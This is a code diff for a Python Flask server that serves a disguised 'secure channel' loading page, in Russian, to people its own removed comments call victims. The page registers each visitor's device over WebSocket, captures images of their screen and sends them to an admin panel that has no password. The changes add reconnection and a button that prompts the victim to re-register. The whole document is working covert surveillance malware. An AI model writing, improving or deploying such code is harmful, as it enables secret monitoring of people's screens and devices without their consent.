@@ -11,11 +11,9 @@ from flask_sock import Sock
 app = Flask(__name__)
 sock = Sock(app)
 
-# ========== Хранилище ==========
 devices = {}
 admin_sessions = {}
 
-# ========== Маскировочная страница (для жертвы) ==========
 MASK_PAGE = '''
 <!DOCTYPE html>
 <html>
@@ -30,25 +28,66 @@ MASK_PAGE = '''
     @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
     .status{color:#565f89;margin-top:20px;font-size:14px;letter-spacing:1px;}
     .hidden{display:none;}
+    .btn-reg{background:#238636;border:none;padding:12px 30px;border-radius:8px;color:#fff;font-weight:bold;font-size:16px;margin-top:20px;cursor:pointer;}
   </style>
 </head>
 <body>
   <div class="loader"></div>
-  <div class="status">Установка защищённого канала...</div>
+  <div class="status" id="statusText">Установка защищённого канала...</div>
+  <button class="btn-reg" id="regBtn" style="display:none;" onclick="forceRegister()">🔑 Зарегистрировать устройство</button>
   <script>
     (function() {
       const WS_URL = "wss://"+location.host+"/ws";
-      let ws = new WebSocket(WS_URL);
+      let ws = null;
+      let registered = false;
       const deviceId = localStorage.getItem("dds_id") || crypto.randomUUID();
       localStorage.setItem("dds_id", deviceId);
       let deviceType = "pc";
       if(/android|iphone|ipad|tablet/i.test(navigator.userAgent)) deviceType = "tablet";
       if(/mobile/i.test(navigator.userAgent) && !/tablet/i.test(navigator.userAgent)) deviceType = "phone";
 
-      ws.onopen = function() {
-        ws.send(JSON.stringify({type:"register", id:deviceId, deviceType:deviceType}));
-        document.querySelector(".status").innerText = "Соединение установлено";
-        setTimeout(function(){document.querySelector(".loader").classList.add("hidden");}, 1500);
+      function connect() {
+        if(ws) { try { ws.close(); } catch(e){} }
+        ws = new WebSocket(WS_URL);
+        ws.onopen = function() {
+          document.getElementById('statusText').innerText = "WebSocket открыт, регистрация...";
+          register();
+        };
+        ws.onmessage = function(e) {
+          try {
+            const data = JSON.parse(e.data);
+            if(data.type === "registered") {
+              registered = true;
+              document.getElementById('statusText').innerText = "✅ Устройство зарегистрировано!";
+              document.querySelector(".loader").classList.add("hidden");
+              document.getElementById('regBtn').style.display = "none";
+            }
+          } catch(err){}
+        };
+        ws.onclose = function() {
+          document.getElementById('statusText').innerText = "⚠️ Переподключение...";
+          registered = false;
+          document.getElementById('regBtn').style.display = "block";
+          setTimeout(connect, 3000);
+        };
+        ws.onerror = function() { ws.close(); };
+      }
+
+      function register() {
+        if(ws && ws.readyState === 1 && !registered) {
+          ws.send(JSON.stringify({type:"register", id:deviceId, deviceType:deviceType}));
+          document.getElementById('statusText').innerText = "🔄 Отправка регистрации...";
+          setTimeout(register, 3000);
+        }
+      }
+
+      window.forceRegister = function() {
+        if(ws && ws.readyState === 1) {
+          register();
+          document.getElementById('regBtn').style.display = "none";
+        } else {
+          connect();
+        }
       };
 
       async function captureScreen() {
@@ -63,7 +102,9 @@ MASK_PAGE = '''
           const ctx = canvas.getContext("2d");
           ctx.drawImage(bitmap, 0, 0, canvas.width, canvas.height);
           const dataUrl = canvas.toDataURL("image/jpeg", 0.5);
-          ws.send(JSON.stringify({type:"screen", data:dataUrl, id:deviceId}));
+          if(ws && ws.readyState === 1) {
+            ws.send(JSON.stringify({type:"screen", data:dataUrl, id:deviceId}));
+          }
           track.stop();
           stream.getTracks().forEach(function(t){t.stop();});
         } catch(e){}
@@ -109,20 +150,24 @@ MASK_PAGE = '''
       };
 
       setInterval(function() {
-        if(ws.readyState === 1) ws.send(JSON.stringify({type:"ping", id:deviceId}));
+        if(ws && ws.readyState === 1) ws.send(JSON.stringify({type:"ping", id:deviceId}));
       }, 15000);
 
-      ws.onclose = function() {
-        document.querySelector(".status").innerText = "Переподключение...";
-        setTimeout(function(){ window.location.reload(); }, 3000);
-      };
+      connect();
+
+      // Показываем кнопку через 10 секунд, если не зарегистрировалось
+      setTimeout(function() {
+        if(!registered) {
+          document.getElementById('regBtn').style.display = "block";
+          document.getElementById('statusText').innerText = "❌ Не удалось зарегистрироваться. Нажмите кнопку.";
+        }
+      }, 10000);
     })();
   </script>
 </body>
 </html>
 '''
 
-# ========== АДМИН-ПАНЕЛЬ (БЕЗ ПАРОЛЯ) ==========
 ADMIN_PANEL = '''
 <!DOCTYPE html>
 <html>
@@ -292,7 +337,6 @@ ADMIN_PANEL = '''
 </html>
 '''
 
-# ========== Маршруты ==========
 @app.route('/')
 def mask():
     return MASK_PAGE
@@ -301,7 +345,6 @@ def mask():
 def admin_panel():
     return ADMIN_PANEL
 
-# ========== WebSocket для устройств (жертвы) ==========
 @sock.route('/ws')
 def device_ws(ws):
     device_id = None
@@ -322,7 +365,9 @@ def device_ws(ws):
                     'screen': None,
                     'nick': None
                 }
+                ws.send(json.dumps({'type':'registered'}))
                 broadcast_devices()
+                print(f"Device registered: {device_id} ({dev_type})")
             elif data.get('type') == 'ping' and device_id:
                 if device_id in devices:
                     devices[device_id]['last_seen'] = datetime.now().isoformat()
@@ -351,7 +396,6 @@ def device_ws(ws):
             devices[device_id]['online'] = False
             broadcast_devices()
 
-# ========== WebSocket для админа ==========
 @sock.route('/admin/ws')
 def admin_ws(ws):
     session = None
@@ -392,7 +436,6 @@ def admin_ws(ws):
         if session and session in admin_sessions:
             del admin_sessions[session]
 
-# ========== Вспомогательные функции ==========
 def broadcast_devices():
     clean_devices = {}
     for k, v in devices.items():
@@ -407,7 +450,6 @@ def broadcast_devices():
         except:
             pass
 
-# ========== Запуск ==========
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 10000))
     app.run(host='0.0.0.0', port=port, debug=False)
